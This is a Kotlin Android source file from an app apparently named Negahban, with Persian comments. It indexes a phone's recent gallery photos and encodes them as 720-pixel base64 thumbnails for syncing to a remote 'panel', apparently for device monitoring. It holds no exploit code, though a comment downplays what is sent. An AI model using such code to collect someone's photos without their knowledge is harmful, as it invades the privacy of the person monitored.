package com.negahban.app.sync

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.provider.MediaStore
import android.util.Base64
import androidx.core.content.ContextCompat
import java.io.ByteArrayOutputStream
import kotlin.math.max

/** یک عکس گالری (فقط مشخصات؛ خود فایل ارسال نمی‌شود) */
data class PhotoEntry(
    val mediaId: Long,
    val takenAt: Long,
    val size: Long,
    val bucket: String
)

/** thumbnail آماده ارسال (base64 از JPEG فشرده) */
data class PhotoThumb(
    val mediaId: Long,
    val base64: String
)

/**
 * خواندن لیست عکس‌های گالری و ساخت thumbnail برای نمایش در پنل.
 * نیازمند مجوز READ_MEDIA_IMAGES (اندروید ۱۳+) یا READ_EXTERNAL_STORAGE است.
 */
object GalleryReader {

    /** حداکثر تعداد عکسی که هر بار ایندکس می‌شود (جدیدترین‌ها اول) */
    const val INDEX_LIMIT = 500

    /** حداکثر thumbnail ارسالی در هر همگام‌سازی (به‌مرور کامل می‌شود) */
    const val THUMBS_PER_SYNC = 12

    /** بزرگ‌ترین ضلع پیش‌نمایش — برای دانلود باکیفیت در پنل */
    private const val THUMB_SIZE = 720

    private const val JPEG_QUALITY = 80

    /** مجوز لازم برای خواندن گالری بر اساس نسخه اندروید */
    fun permissionName(): String =
        if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES
        else Manifest.permission.READ_EXTERNAL_STORAGE

    fun hasPermission(context: Context): Boolean =
        ContextCompat.checkSelfPermission(context, permissionName()) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED

    /** لیست جدیدترین عکس‌های گالری (ایندکس؛ بدون فایل) */
    fun index(context: Context, limit: Int = INDEX_LIMIT): List<PhotoEntry> {
        if (!hasPermission(context)) return emptyList()
        val result = mutableListOf<PhotoEntry>()
        try {
            context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                ),
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT $limit"
            )?.use { c ->
                val idIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val dateIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val sizeIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val bucketIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                while (c.moveToNext()) {
                    result.add(
                        PhotoEntry(
                            mediaId = c.getLong(idIdx),
                            takenAt = c.getLong(dateIdx) * 1000L,
                            size = c.getLong(sizeIdx),
                            bucket = c.getString(bucketIdx) ?: ""
                        )
                    )
                }
            }
        } catch (e: Exception) {
            // خطا در دسترسی به MediaStore
        }
        return result
    }

    /**
     * ساخت thumbnail فشرده از یک عکس و تبدیل به base64.
     * خروجی null یعنی ساخت thumbnail ممکن نشد (عکس حذف شده یا خراب).
     */
    fun thumbnailBase64(context: Context, mediaId: Long): String? {
        if (!hasPermission(context)) return null
        return try {
            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)
            val bmp: Bitmap? = if (Build.VERSION.SDK_INT >= 29) {
                context.contentResolver.loadThumbnail(
                    uri,
                    android.util.Size(THUMB_SIZE, THUMB_SIZE),
                    null
                )
            } else {
                decodeSampled(context, uri)
            }
            if (bmp == null || bmp.width == 0 || bmp.height == 0) return null
            val out = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    /** برای اندروید ۸ تا ۱۲: دانلود با inSampleSize تا حداکثر THUMB_SIZE پیکسل */
    private fun decodeSampled(context: Context, uri: android.net.Uri): Bitmap? {
        val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        context.contentResolver.openInputStream(uri)?.use {
            BitmapFactory.decodeStream(it, null, bounds)
        } ?: return null
        var sample = 1
        var longest = max(bounds.outWidth, bounds.outHeight)
        while (longest / (sample * 2) >= THUMB_SIZE) sample *= 2
        val opts = BitmapFactory.Options().apply { inSampleSize = sample }
        return context.contentResolver.openInputStream(uri)?.use {
            BitmapFactory.decodeStream(it, null, opts)
        }
    }
}
